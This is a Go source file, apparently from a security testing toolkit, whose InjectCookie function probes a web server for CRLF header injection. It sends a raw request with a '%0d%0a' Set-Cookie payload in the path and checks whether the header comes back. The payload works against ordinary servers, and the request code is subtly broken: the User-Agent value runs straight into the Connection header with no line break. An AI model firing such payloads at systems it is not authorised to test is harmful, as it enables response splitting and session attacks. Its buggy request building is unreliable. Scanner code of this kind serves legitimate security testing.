package httph

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"strings"

	astkitClient "github.com/fhAnso/ASTkit/client"
)

type HeaderInjectionConfig struct {
	Client    *astkitClient.ASTkitClient
	UserAgent string
	Host      string
	Port      uint16
}

// Ensure the injected cookie is reflected in the response.
func InjectCookie(config HeaderInjectionConfig) (string, error) {
	url := MakeUrl(HTTP(Basic), config.Host)
	if config.Port == 443 || config.Port == 8443 {
		url = MakeUrl(HTTP(Secure), config.Host)
	}
	// Send first request to get cookies
	response, err := SendRequest(config.Client, http.MethodGet, url)
	if response == nil {
		return "", fmt.Errorf("unable to send request to target: %s", err)
	}
	cookies := response.Cookies()
	if len(cookies) == 0 {
		return "", fmt.Errorf("no cookies in response")
	}
	cookieName := cookies[0].Name
	tcpDial, err := net.Dial("tcp", fmt.Sprintf("%s:%d", config.Host, config.Port))
	if err != nil {
		return "", fmt.Errorf("could not connect to target: %s", err)
	}
	defer response.Body.Close()
	defer tcpDial.Close()
	payload := fmt.Sprintf("Set-Cookie:+%s=jzqvtyxkplra", cookieName)
	rawRequest := "GET /favicon.ico%0d%0a" + payload + " HTTP/1.1\r\n" +
		"Host: " + config.Host + "\r\n" +
		"User-Agent:" + config.UserAgent +
		"Connection: close\r\n" +
		"\r\n"
	_, err = tcpDial.Write([]byte(rawRequest)) // Send raw request to [config.Host]
	if err != nil {
		return "", fmt.Errorf("failed to send raw request: %s", err)
	}
	// Read response headers
	responseReader := bufio.NewReader(tcpDial)
	for {
		currentHeader, err := responseReader.ReadString('\n')
		if err != nil {
			break
		}
		if strings.Contains(currentHeader, payload) {
			return fmt.Sprintf("Payload reflected: %s\n", payload), nil
		}
		if currentHeader == "\r\n" { // Response headers end here
			break
		}
	}
	return "", nil
}
